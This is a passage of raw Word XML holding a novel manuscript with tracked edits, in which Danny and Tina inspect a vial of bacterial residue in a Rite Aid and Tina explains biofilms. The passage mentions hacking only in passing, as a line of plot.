            <w:color w:val="000000"/>
            <w:sz w:val="24"/>
            <w:szCs w:val="24"/>
          </w:rPr>
          <w:delText>said with</w:delText>
        </w:r>
      </w:del>
      <w:r w:rsidRPr="000D3488">
        <w:rPr>
          <w:rFonts w:ascii="Georgia" w:eastAsia="Times New Roman" w:hAnsi="Georgia" w:cs="Times New Roman"/>
          <w:color w:val="000000"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t xml:space="preserve"> an enormous, cocky smirk.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commentRangeStart w:id="1848"/>
      <w:r w:rsidRPr="000D3488">
        <w:rPr>
          <w:rFonts w:ascii="Georgia" w:eastAsia="Times New Roman" w:hAnsi="Georgia" w:cs="Times New Roman"/>
          <w:color w:val="000000"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t>“You just hacked the Russian mob,” she said, grinning in incredulity.</w:t>
      </w:r>
      <w:commentRangeEnd w:id="1848"/>
      <w:r w:rsidR="00D64D27">
        <w:rPr>
          <w:rStyle w:val="CommentReference"/>
        </w:rPr>
        <w:commentReference w:id="1848"/>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“Uhhhhh, kindasorta, yeah.”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“Using nothing but the dude’s cell!”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“…Hot,” she said, slightly lowering her head. She self-consciously ran her fingers through her hair, aware that it was a mess. Her eyes stayed trained on him, looking upward, meeting his gaze. She smiled flirtatiously, nibbling ever so slightly on her lip.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stepped toward her. He placed the Pantech into her hand, the skin of their fingers brushing against one another. “Tina. I want to ask you something.” His breathing palpitated with tension and urgency.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 ahead,” she said eagerly.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“Does this Rite Aid have a bathroom? ‘Cuz I have to take one massive leak.”</w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="000D3488" w:rsidRPr="000D3488" w:rsidRDefault="000D3488" w:rsidP="000D3488">
      <w:pPr>
        <w:spacing w:after="0" w:line="420" w:lineRule="atLeast"/>
        <w:rPr>
          <w:rFonts w:ascii="Georgia" w:eastAsia="Times New Roman" w:hAnsi="Georgia" w:cs="Times New Roman"/>
          <w:color w:val="000000"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
      </w:pPr>
      <w:commentRangeStart w:id="1849"/>
      <w:r w:rsidRPr="000D3488">
        <w:rPr>
          <w:rFonts w:ascii="Georgia" w:eastAsia="Times New Roman" w:hAnsi="Georgia" w:cs="Times New Roman"/>
          <w:smallCaps/>
          <w:color w:val="000000"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t>Danny came back to find</w:t>
      </w:r>
      <w:commentRangeEnd w:id="1849"/>
      <w:r w:rsidR="00F07C10">
        <w:rPr>
          <w:rStyle w:val="CommentReference"/>
        </w:rPr>
        <w:commentReference w:id="1849"/>
      </w:r>
      <w:r w:rsidRPr="000D3488">
        <w:rPr>
          <w:rFonts w:ascii="Georgia" w:eastAsia="Times New Roman" w:hAnsi="Georgia" w:cs="Times New Roman"/>
          <w:color w:val="000000"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t> Tina still at the register, with the empty OJ and the pile of Clif Bar wrappers in the basket beside her. She was holding the Eppendorf tube up to her eyes, scrutinizing it very closely.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know what you’re thinking,” said Danny, “and the answer is: Yes, I </w:t>
      </w:r>
      <w:r w:rsidRPr="000D3488">
        <w:rPr>
          <w:rFonts w:ascii="Georgia" w:eastAsia="Times New Roman" w:hAnsi="Georgia" w:cs="Times New Roman"/>
          <w:i/>
          <w:iCs/>
          <w:color w:val="000000"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t>can</w:t>
      </w:r>
      <w:r w:rsidRPr="000D3488">
        <w:rPr>
          <w:rFonts w:ascii="Georgia" w:eastAsia="Times New Roman" w:hAnsi="Georgia" w:cs="Times New Roman"/>
          <w:color w:val="000000"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t> use that to make a teeny tiny little lava lamp.”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 at this…” she said, fascinated.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moved his face next to hers. Together, they stared intently at the vial of brown slime. The smiley face sticker on the side</w:t>
      </w:r>
      <w:del w:id="1850" w:author="TextVet" w:date="2016-03-20T10:20:00Z">
        <w:r w:rsidRPr="000D3488" w:rsidDel="00A178AE">
          <w:rPr>
            <w:rFonts w:ascii="Georgia" w:eastAsia="Times New Roman" w:hAnsi="Georgia" w:cs="Times New Roman"/>
            <w:color w:val="000000"/>
            <w:sz w:val="24"/>
            <w:szCs w:val="24"/>
          </w:rPr>
          <w:delText xml:space="preserve"> of the vial</w:delText>
        </w:r>
      </w:del>
      <w:r w:rsidRPr="000D3488">
        <w:rPr>
          <w:rFonts w:ascii="Georgia" w:eastAsia="Times New Roman" w:hAnsi="Georgia" w:cs="Times New Roman"/>
          <w:color w:val="000000"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t xml:space="preserve"> s</w:t>
      </w:r>
      <w:ins w:id="1851" w:author="TextVet" w:date="2016-03-20T10:19:00Z">
        <w:r w:rsidR="00544422">
          <w:rPr>
            <w:rFonts w:ascii="Georgia" w:eastAsia="Times New Roman" w:hAnsi="Georgia" w:cs="Times New Roman"/>
            <w:color w:val="000000"/>
            <w:sz w:val="24"/>
            <w:szCs w:val="24"/>
          </w:rPr>
          <w:t>e</w:t>
        </w:r>
      </w:ins>
      <w:del w:id="1852" w:author="TextVet" w:date="2016-03-20T10:19:00Z">
        <w:r w:rsidRPr="000D3488" w:rsidDel="00544422">
          <w:rPr>
            <w:rFonts w:ascii="Georgia" w:eastAsia="Times New Roman" w:hAnsi="Georgia" w:cs="Times New Roman"/>
            <w:color w:val="000000"/>
            <w:sz w:val="24"/>
            <w:szCs w:val="24"/>
          </w:rPr>
          <w:delText>tar</w:delText>
        </w:r>
      </w:del>
      <w:r w:rsidRPr="000D3488">
        <w:rPr>
          <w:rFonts w:ascii="Georgia" w:eastAsia="Times New Roman" w:hAnsi="Georgia" w:cs="Times New Roman"/>
          <w:color w:val="000000"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t>e</w:t>
      </w:r>
      <w:ins w:id="1853" w:author="TextVet" w:date="2016-03-20T10:19:00Z">
        <w:r w:rsidR="00544422">
          <w:rPr>
            <w:rFonts w:ascii="Georgia" w:eastAsia="Times New Roman" w:hAnsi="Georgia" w:cs="Times New Roman"/>
            <w:color w:val="000000"/>
            <w:sz w:val="24"/>
            <w:szCs w:val="24"/>
          </w:rPr>
          <w:t>me</w:t>
        </w:r>
      </w:ins>
      <w:r w:rsidRPr="000D3488">
        <w:rPr>
          <w:rFonts w:ascii="Georgia" w:eastAsia="Times New Roman" w:hAnsi="Georgia" w:cs="Times New Roman"/>
          <w:color w:val="000000"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t xml:space="preserve">d </w:t>
      </w:r>
      <w:ins w:id="1854" w:author="TextVet" w:date="2016-03-20T10:19:00Z">
        <w:r w:rsidR="00544422">
          <w:rPr>
            <w:rFonts w:ascii="Georgia" w:eastAsia="Times New Roman" w:hAnsi="Georgia" w:cs="Times New Roman"/>
            <w:color w:val="000000"/>
            <w:sz w:val="24"/>
            <w:szCs w:val="24"/>
          </w:rPr>
          <w:t>to taunt</w:t>
        </w:r>
      </w:ins>
      <w:del w:id="1855" w:author="TextVet" w:date="2016-03-20T10:19:00Z">
        <w:r w:rsidRPr="000D3488" w:rsidDel="00544422">
          <w:rPr>
            <w:rFonts w:ascii="Georgia" w:eastAsia="Times New Roman" w:hAnsi="Georgia" w:cs="Times New Roman"/>
            <w:color w:val="000000"/>
            <w:sz w:val="24"/>
            <w:szCs w:val="24"/>
          </w:rPr>
          <w:delText>back at</w:delText>
        </w:r>
      </w:del>
      <w:r w:rsidRPr="000D3488">
        <w:rPr>
          <w:rFonts w:ascii="Georgia" w:eastAsia="Times New Roman" w:hAnsi="Georgia" w:cs="Times New Roman"/>
          <w:color w:val="000000"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t xml:space="preserve">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am I supposed to be seeing?” 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not goopy inside,” she said, shaking it. “I think it’s crusty.”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do you still have that </w:t>
      </w:r>
      <w:del w:id="1856" w:author="TextVet" w:date="2016-03-20T10:32:00Z">
        <w:r w:rsidRPr="000D3488" w:rsidDel="00CE740F">
          <w:rPr>
            <w:rFonts w:ascii="Georgia" w:eastAsia="Times New Roman" w:hAnsi="Georgia" w:cs="Times New Roman"/>
            <w:color w:val="000000"/>
            <w:sz w:val="24"/>
            <w:szCs w:val="24"/>
          </w:rPr>
          <w:delText>paper clip</w:delText>
        </w:r>
      </w:del>
      <w:ins w:id="1857" w:author="TextVet" w:date="2016-03-20T10:32:00Z">
        <w:r w:rsidR="00CE740F">
          <w:rPr>
            <w:rFonts w:ascii="Georgia" w:eastAsia="Times New Roman" w:hAnsi="Georgia" w:cs="Times New Roman"/>
            <w:color w:val="000000"/>
            <w:sz w:val="24"/>
            <w:szCs w:val="24"/>
          </w:rPr>
          <w:t>paperclip</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handed it to her. She straightened the clip into a long metal wire. “We need to sterilize this,” she said. With vial and </w:t>
      </w:r>
      <w:del w:id="1858" w:author="TextVet" w:date="2016-03-20T10:32:00Z">
        <w:r w:rsidRPr="000D3488" w:rsidDel="00CE740F">
          <w:rPr>
            <w:rFonts w:ascii="Georgia" w:eastAsia="Times New Roman" w:hAnsi="Georgia" w:cs="Times New Roman"/>
            <w:color w:val="000000"/>
            <w:sz w:val="24"/>
            <w:szCs w:val="24"/>
          </w:rPr>
          <w:delText>paper clip</w:delText>
        </w:r>
      </w:del>
      <w:ins w:id="1859" w:author="TextVet" w:date="2016-03-20T10:32:00Z">
        <w:r w:rsidR="00CE740F">
          <w:rPr>
            <w:rFonts w:ascii="Georgia" w:eastAsia="Times New Roman" w:hAnsi="Georgia" w:cs="Times New Roman"/>
            <w:color w:val="000000"/>
            <w:sz w:val="24"/>
            <w:szCs w:val="24"/>
          </w:rPr>
          <w:t>paperclip</w:t>
        </w:r>
      </w:ins>
      <w:r w:rsidRPr="000D3488">
        <w:rPr>
          <w:rFonts w:ascii="Georgia" w:eastAsia="Times New Roman" w:hAnsi="Georgia" w:cs="Times New Roman"/>
          <w:color w:val="000000"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t xml:space="preserve"> in hand, she marched back into the store, retrieving another shopping basket on the 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commentRangeStart w:id="1860"/>
      <w:r w:rsidRPr="000D3488">
        <w:rPr>
          <w:rFonts w:ascii="Georgia" w:eastAsia="Times New Roman" w:hAnsi="Georgia" w:cs="Times New Roman"/>
          <w:color w:val="000000"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t>Danny followed her to the First Aid aisle. Her first move was to find a box of latex gloves. She tore the box and pulled one white glove onto her hand.</w:t>
      </w:r>
      <w:commentRangeEnd w:id="1860"/>
      <w:r w:rsidR="004B61FE">
        <w:rPr>
          <w:rStyle w:val="CommentReference"/>
        </w:rPr>
        <w:commentReference w:id="1860"/>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grabbed a small bottle of rubbing alcohol and set it on an empty shelf nearby. She dipped the </w:t>
      </w:r>
      <w:del w:id="1861" w:author="TextVet" w:date="2016-03-20T10:32:00Z">
        <w:r w:rsidRPr="000D3488" w:rsidDel="00CE740F">
          <w:rPr>
            <w:rFonts w:ascii="Georgia" w:eastAsia="Times New Roman" w:hAnsi="Georgia" w:cs="Times New Roman"/>
            <w:color w:val="000000"/>
            <w:sz w:val="24"/>
            <w:szCs w:val="24"/>
          </w:rPr>
          <w:delText>paper clip</w:delText>
        </w:r>
      </w:del>
      <w:ins w:id="1862" w:author="TextVet" w:date="2016-03-20T10:32:00Z">
        <w:r w:rsidR="00CE740F">
          <w:rPr>
            <w:rFonts w:ascii="Georgia" w:eastAsia="Times New Roman" w:hAnsi="Georgia" w:cs="Times New Roman"/>
            <w:color w:val="000000"/>
            <w:sz w:val="24"/>
            <w:szCs w:val="24"/>
          </w:rPr>
          <w:t>paperclip</w:t>
        </w:r>
      </w:ins>
      <w:r w:rsidRPr="000D3488">
        <w:rPr>
          <w:rFonts w:ascii="Georgia" w:eastAsia="Times New Roman" w:hAnsi="Georgia" w:cs="Times New Roman"/>
          <w:color w:val="000000"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t xml:space="preserve"> and held it there</w:t>
      </w:r>
      <w:ins w:id="1863" w:author="TextVet" w:date="2016-03-20T10:26:00Z">
        <w:r w:rsidR="008B1DB4">
          <w:rPr>
            <w:rFonts w:ascii="Georgia" w:eastAsia="Times New Roman" w:hAnsi="Georgia" w:cs="Times New Roman"/>
            <w:color w:val="000000"/>
            <w:sz w:val="24"/>
            <w:szCs w:val="24"/>
          </w:rPr>
          <w:t xml:space="preserve"> to</w:t>
        </w:r>
      </w:ins>
      <w:del w:id="1864" w:author="TextVet" w:date="2016-03-20T10:26:00Z">
        <w:r w:rsidRPr="000D3488" w:rsidDel="008B1DB4">
          <w:rPr>
            <w:rFonts w:ascii="Georgia" w:eastAsia="Times New Roman" w:hAnsi="Georgia" w:cs="Times New Roman"/>
            <w:color w:val="000000"/>
            <w:sz w:val="24"/>
            <w:szCs w:val="24"/>
          </w:rPr>
          <w:delText>, letting it</w:delText>
        </w:r>
      </w:del>
      <w:r w:rsidRPr="000D3488">
        <w:rPr>
          <w:rFonts w:ascii="Georgia" w:eastAsia="Times New Roman" w:hAnsi="Georgia" w:cs="Times New Roman"/>
          <w:color w:val="000000"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t xml:space="preserve"> soak. Danny heard her counting time under her breath. She repeated the process with each finger of her latex-gloved hand, drying them off with a few brisk shakes. “Good enough,” she mumbled.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With her tools and </w:t>
      </w:r>
      <w:del w:id="1865" w:author="TextVet" w:date="2016-03-20T10:26:00Z">
        <w:r w:rsidRPr="000D3488" w:rsidDel="004C44C5">
          <w:rPr>
            <w:rFonts w:ascii="Georgia" w:eastAsia="Times New Roman" w:hAnsi="Georgia" w:cs="Times New Roman"/>
            <w:color w:val="000000"/>
            <w:sz w:val="24"/>
            <w:szCs w:val="24"/>
          </w:rPr>
          <w:delText xml:space="preserve">her </w:delText>
        </w:r>
      </w:del>
      <w:r w:rsidRPr="000D3488">
        <w:rPr>
          <w:rFonts w:ascii="Georgia" w:eastAsia="Times New Roman" w:hAnsi="Georgia" w:cs="Times New Roman"/>
          <w:color w:val="000000"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t xml:space="preserve">fingers adequately cleaned, she popped the top of the Eppendorf tube and dipped the tip of the </w:t>
      </w:r>
      <w:del w:id="1866" w:author="TextVet" w:date="2016-03-20T10:32:00Z">
        <w:r w:rsidRPr="000D3488" w:rsidDel="00CE740F">
          <w:rPr>
            <w:rFonts w:ascii="Georgia" w:eastAsia="Times New Roman" w:hAnsi="Georgia" w:cs="Times New Roman"/>
            <w:color w:val="000000"/>
            <w:sz w:val="24"/>
            <w:szCs w:val="24"/>
          </w:rPr>
          <w:delText>paper clip</w:delText>
        </w:r>
      </w:del>
      <w:ins w:id="1867" w:author="TextVet" w:date="2016-03-20T10:32:00Z">
        <w:r w:rsidR="00CE740F">
          <w:rPr>
            <w:rFonts w:ascii="Georgia" w:eastAsia="Times New Roman" w:hAnsi="Georgia" w:cs="Times New Roman"/>
            <w:color w:val="000000"/>
            <w:sz w:val="24"/>
            <w:szCs w:val="24"/>
          </w:rPr>
          <w:t>paperclip</w:t>
        </w:r>
      </w:ins>
      <w:r w:rsidRPr="000D3488">
        <w:rPr>
          <w:rFonts w:ascii="Georgia" w:eastAsia="Times New Roman" w:hAnsi="Georgia" w:cs="Times New Roman"/>
          <w:color w:val="000000"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t xml:space="preserve"> into the vial. It made a hard scratching sound. When she was done, she pulled the paperclip </w:t>
      </w:r>
      <w:ins w:id="1868" w:author="TextVet" w:date="2016-03-20T10:32:00Z">
        <w:r w:rsidR="00CE740F">
          <w:rPr>
            <w:rFonts w:ascii="Georgia" w:eastAsia="Times New Roman" w:hAnsi="Georgia" w:cs="Times New Roman"/>
            <w:color w:val="000000"/>
            <w:sz w:val="24"/>
            <w:szCs w:val="24"/>
          </w:rPr>
          <w:t>from</w:t>
        </w:r>
      </w:ins>
      <w:del w:id="1869" w:author="TextVet" w:date="2016-03-20T10:32:00Z">
        <w:r w:rsidRPr="000D3488" w:rsidDel="00CE740F">
          <w:rPr>
            <w:rFonts w:ascii="Georgia" w:eastAsia="Times New Roman" w:hAnsi="Georgia" w:cs="Times New Roman"/>
            <w:color w:val="000000"/>
            <w:sz w:val="24"/>
            <w:szCs w:val="24"/>
          </w:rPr>
          <w:delText>out of</w:delText>
        </w:r>
      </w:del>
      <w:r w:rsidRPr="000D3488">
        <w:rPr>
          <w:rFonts w:ascii="Georgia" w:eastAsia="Times New Roman" w:hAnsi="Georgia" w:cs="Times New Roman"/>
          <w:color w:val="000000"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t xml:space="preserve"> the tube and examined it closely.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pale brown goo had congealed into a hard resin that clung to the </w:t>
      </w:r>
      <w:del w:id="1870" w:author="TextVet" w:date="2016-03-20T10:32:00Z">
        <w:r w:rsidRPr="000D3488" w:rsidDel="00CE740F">
          <w:rPr>
            <w:rFonts w:ascii="Georgia" w:eastAsia="Times New Roman" w:hAnsi="Georgia" w:cs="Times New Roman"/>
            <w:color w:val="000000"/>
            <w:sz w:val="24"/>
            <w:szCs w:val="24"/>
          </w:rPr>
          <w:delText>paper clip</w:delText>
        </w:r>
      </w:del>
      <w:ins w:id="1871" w:author="TextVet" w:date="2016-03-20T10:32:00Z">
        <w:r w:rsidR="00CE740F">
          <w:rPr>
            <w:rFonts w:ascii="Georgia" w:eastAsia="Times New Roman" w:hAnsi="Georgia" w:cs="Times New Roman"/>
            <w:color w:val="000000"/>
            <w:sz w:val="24"/>
            <w:szCs w:val="24"/>
          </w:rPr>
          <w:t>paperclip</w:t>
        </w:r>
      </w:ins>
      <w:r w:rsidRPr="000D3488">
        <w:rPr>
          <w:rFonts w:ascii="Georgia" w:eastAsia="Times New Roman" w:hAnsi="Georgia" w:cs="Times New Roman"/>
          <w:color w:val="000000"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t xml:space="preserve"> in large crusty yellow flakes. Looking at it</w:t>
      </w:r>
      <w:ins w:id="1872" w:author="TextVet" w:date="2016-03-20T10:37:00Z">
        <w:r w:rsidR="003F1A13">
          <w:rPr>
            <w:rFonts w:ascii="Georgia" w:eastAsia="Times New Roman" w:hAnsi="Georgia" w:cs="Times New Roman"/>
            <w:color w:val="000000"/>
            <w:sz w:val="24"/>
            <w:szCs w:val="24"/>
          </w:rPr>
          <w:t xml:space="preserve">, </w:t>
        </w:r>
      </w:ins>
      <w:del w:id="1873" w:author="TextVet" w:date="2016-03-20T10:36:00Z">
        <w:r w:rsidRPr="000D3488" w:rsidDel="003F1A13">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 xml:space="preserve">Danny </w:t>
      </w:r>
      <w:del w:id="1874" w:author="TextVet" w:date="2016-03-20T10:37:00Z">
        <w:r w:rsidRPr="000D3488" w:rsidDel="003F1A13">
          <w:rPr>
            <w:rFonts w:ascii="Georgia" w:eastAsia="Times New Roman" w:hAnsi="Georgia" w:cs="Times New Roman"/>
            <w:color w:val="000000"/>
            <w:sz w:val="24"/>
            <w:szCs w:val="24"/>
          </w:rPr>
          <w:delText>was reminded</w:delText>
        </w:r>
      </w:del>
      <w:ins w:id="1875" w:author="TextVet" w:date="2016-03-20T10:37:00Z">
        <w:r w:rsidR="003F1A13">
          <w:rPr>
            <w:rFonts w:ascii="Georgia" w:eastAsia="Times New Roman" w:hAnsi="Georgia" w:cs="Times New Roman"/>
            <w:color w:val="000000"/>
            <w:sz w:val="24"/>
            <w:szCs w:val="24"/>
          </w:rPr>
          <w:t>thought</w:t>
        </w:r>
      </w:ins>
      <w:r w:rsidRPr="000D3488">
        <w:rPr>
          <w:rFonts w:ascii="Georgia" w:eastAsia="Times New Roman" w:hAnsi="Georgia" w:cs="Times New Roman"/>
          <w:color w:val="000000"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t xml:space="preserve"> of something a dentist might scrape off </w:t>
      </w:r>
      <w:del w:id="1876" w:author="TextVet" w:date="2016-03-20T10:27:00Z">
        <w:r w:rsidRPr="000D3488" w:rsidDel="002950C0">
          <w:rPr>
            <w:rFonts w:ascii="Georgia" w:eastAsia="Times New Roman" w:hAnsi="Georgia" w:cs="Times New Roman"/>
            <w:color w:val="000000"/>
            <w:sz w:val="24"/>
            <w:szCs w:val="24"/>
          </w:rPr>
          <w:delText xml:space="preserve">of </w:delText>
        </w:r>
      </w:del>
      <w:r w:rsidRPr="000D3488">
        <w:rPr>
          <w:rFonts w:ascii="Georgia" w:eastAsia="Times New Roman" w:hAnsi="Georgia" w:cs="Times New Roman"/>
          <w:color w:val="000000"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t>the back of someone’s teeth.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“Is it supposed to do that?” </w:t>
      </w:r>
      <w:del w:id="1877" w:author="TextVet" w:date="2016-03-20T10:38:00Z">
        <w:r w:rsidRPr="000D3488" w:rsidDel="000C4642">
          <w:rPr>
            <w:rFonts w:ascii="Georgia" w:eastAsia="Times New Roman" w:hAnsi="Georgia" w:cs="Times New Roman"/>
            <w:color w:val="000000"/>
            <w:sz w:val="24"/>
            <w:szCs w:val="24"/>
          </w:rPr>
          <w:delText>Danny</w:delText>
        </w:r>
      </w:del>
      <w:ins w:id="1878" w:author="TextVet" w:date="2016-03-20T10:38:00Z">
        <w:r w:rsidR="000C4642">
          <w:rPr>
            <w:rFonts w:ascii="Georgia" w:eastAsia="Times New Roman" w:hAnsi="Georgia" w:cs="Times New Roman"/>
            <w:color w:val="000000"/>
            <w:sz w:val="24"/>
            <w:szCs w:val="24"/>
          </w:rPr>
          <w:t>he</w:t>
        </w:r>
      </w:ins>
      <w:r w:rsidRPr="000D3488">
        <w:rPr>
          <w:rFonts w:ascii="Georgia" w:eastAsia="Times New Roman" w:hAnsi="Georgia" w:cs="Times New Roman"/>
          <w:color w:val="000000"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t xml:space="preserv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“Only when they’re scared shitless,” Tina replied, closing the tube.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“Who’s ‘they’?” Danny felt clueless.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xml:space="preserve"> bacteria,” Tina answered, staring at the yellow-white crust on the tip of the paperclip. She gently transferred the flake to her </w:t>
      </w:r>
      <w:del w:id="1879" w:author="TextVet" w:date="2016-03-20T14:19:00Z">
        <w:r w:rsidRPr="000D3488" w:rsidDel="0007729B">
          <w:rPr>
            <w:rFonts w:ascii="Georgia" w:eastAsia="Times New Roman" w:hAnsi="Georgia" w:cs="Times New Roman"/>
            <w:color w:val="000000"/>
            <w:sz w:val="24"/>
            <w:szCs w:val="24"/>
          </w:rPr>
          <w:delText>latex-</w:delText>
        </w:r>
      </w:del>
      <w:r w:rsidRPr="000D3488">
        <w:rPr>
          <w:rFonts w:ascii="Georgia" w:eastAsia="Times New Roman" w:hAnsi="Georgia" w:cs="Times New Roman"/>
          <w:color w:val="000000"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t>gloved index finger, and held it inches from her eye, holding her breath as she studied the substance.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can tell what mood they’re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pinched the grain between </w:t>
      </w:r>
      <w:del w:id="1880" w:author="TextVet" w:date="2016-03-20T14:19:00Z">
        <w:r w:rsidRPr="000D3488" w:rsidDel="00D56B38">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he</w:t>
      </w:r>
      <w:ins w:id="1881" w:author="TextVet" w:date="2016-03-20T14:19:00Z">
        <w:r w:rsidR="00D56B38">
          <w:rPr>
            <w:rFonts w:ascii="Georgia" w:eastAsia="Times New Roman" w:hAnsi="Georgia" w:cs="Times New Roman"/>
            <w:color w:val="000000"/>
            <w:sz w:val="24"/>
            <w:szCs w:val="24"/>
          </w:rPr>
          <w:t>r</w:t>
        </w:r>
      </w:ins>
      <w:r w:rsidRPr="000D3488">
        <w:rPr>
          <w:rFonts w:ascii="Georgia" w:eastAsia="Times New Roman" w:hAnsi="Georgia" w:cs="Times New Roman"/>
          <w:color w:val="000000"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t xml:space="preserve"> thumb and forefinger</w:t>
      </w:r>
      <w:del w:id="1882" w:author="TextVet" w:date="2016-03-20T14:20:00Z">
        <w:r w:rsidRPr="000D3488" w:rsidDel="00D56B38">
          <w:rPr>
            <w:rFonts w:ascii="Georgia" w:eastAsia="Times New Roman" w:hAnsi="Georgia" w:cs="Times New Roman"/>
            <w:color w:val="000000"/>
            <w:sz w:val="24"/>
            <w:szCs w:val="24"/>
          </w:rPr>
          <w:delText xml:space="preserve"> of her </w:delText>
        </w:r>
      </w:del>
      <w:del w:id="1883" w:author="TextVet" w:date="2016-03-20T14:19:00Z">
        <w:r w:rsidRPr="000D3488" w:rsidDel="00D56B38">
          <w:rPr>
            <w:rFonts w:ascii="Georgia" w:eastAsia="Times New Roman" w:hAnsi="Georgia" w:cs="Times New Roman"/>
            <w:color w:val="000000"/>
            <w:sz w:val="24"/>
            <w:szCs w:val="24"/>
          </w:rPr>
          <w:delText>gloved hand</w:delText>
        </w:r>
      </w:del>
      <w:r w:rsidRPr="000D3488">
        <w:rPr>
          <w:rFonts w:ascii="Georgia" w:eastAsia="Times New Roman" w:hAnsi="Georgia" w:cs="Times New Roman"/>
          <w:color w:val="000000"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t>. She used her other hand to roll off the glove, turning it inside out, holding the pinch the whole time. When it was finally off</w:t>
      </w:r>
      <w:ins w:id="1884" w:author="TextVet" w:date="2016-03-20T14:20:00Z">
        <w:r w:rsidR="00042F36">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she gave the latex several twists and knotted it off near the base of the digits. The yellowish flake remained sealed in the glove’s inverted surface.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“They’ve locked themselves into a biofilm,” Tina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shrugged dumbly.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“It’s like they’re circling their wagons,” she said. “It’s a cooperative emergency defense mechanism. A lot of strains of bacteria, when they feel like they’re in danger, </w:t>
      </w:r>
      <w:del w:id="1885" w:author="TextVet" w:date="2016-03-20T14:21:00Z">
        <w:r w:rsidRPr="000D3488" w:rsidDel="00042F36">
          <w:rPr>
            <w:rFonts w:ascii="Georgia" w:eastAsia="Times New Roman" w:hAnsi="Georgia" w:cs="Times New Roman"/>
            <w:color w:val="000000"/>
            <w:sz w:val="24"/>
            <w:szCs w:val="24"/>
          </w:rPr>
          <w:delText xml:space="preserve">they </w:delText>
        </w:r>
      </w:del>
      <w:r w:rsidRPr="000D3488">
        <w:rPr>
          <w:rFonts w:ascii="Georgia" w:eastAsia="Times New Roman" w:hAnsi="Georgia" w:cs="Times New Roman"/>
          <w:color w:val="000000"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t xml:space="preserve">start to exude this thick mix of starches and proteins. A bacterium starts cranking this stuff out when it senses it’s dying. When nearby bacteria feel their neighbors spewing this stuff, they start </w:t>
      </w:r>
      <w:del w:id="1886" w:author="TextVet" w:date="2016-03-20T14:22:00Z">
        <w:r w:rsidRPr="000D3488" w:rsidDel="00F7769E">
          <w:rPr>
            <w:rFonts w:ascii="Georgia" w:eastAsia="Times New Roman" w:hAnsi="Georgia" w:cs="Times New Roman"/>
            <w:color w:val="000000"/>
            <w:sz w:val="24"/>
            <w:szCs w:val="24"/>
          </w:rPr>
          <w:delText xml:space="preserve">to </w:delText>
        </w:r>
      </w:del>
      <w:r w:rsidRPr="000D3488">
        <w:rPr>
          <w:rFonts w:ascii="Georgia" w:eastAsia="Times New Roman" w:hAnsi="Georgia" w:cs="Times New Roman"/>
          <w:color w:val="000000"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t>spew</w:t>
      </w:r>
      <w:ins w:id="1887" w:author="TextVet" w:date="2016-03-20T14:22:00Z">
        <w:r w:rsidR="00F7769E">
          <w:rPr>
            <w:rFonts w:ascii="Georgia" w:eastAsia="Times New Roman" w:hAnsi="Georgia" w:cs="Times New Roman"/>
            <w:color w:val="000000"/>
            <w:sz w:val="24"/>
            <w:szCs w:val="24"/>
          </w:rPr>
          <w:t>ing</w:t>
        </w:r>
      </w:ins>
      <w:del w:id="1888" w:author="TextVet" w:date="2016-03-20T14:22:00Z">
        <w:r w:rsidRPr="000D3488" w:rsidDel="007527AD">
          <w:rPr>
            <w:rFonts w:ascii="Georgia" w:eastAsia="Times New Roman" w:hAnsi="Georgia" w:cs="Times New Roman"/>
            <w:color w:val="000000"/>
            <w:sz w:val="24"/>
            <w:szCs w:val="24"/>
          </w:rPr>
          <w:delText xml:space="preserve"> it</w:delText>
        </w:r>
      </w:del>
      <w:r w:rsidRPr="000D3488">
        <w:rPr>
          <w:rFonts w:ascii="Georgia" w:eastAsia="Times New Roman" w:hAnsi="Georgia" w:cs="Times New Roman"/>
          <w:color w:val="000000"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
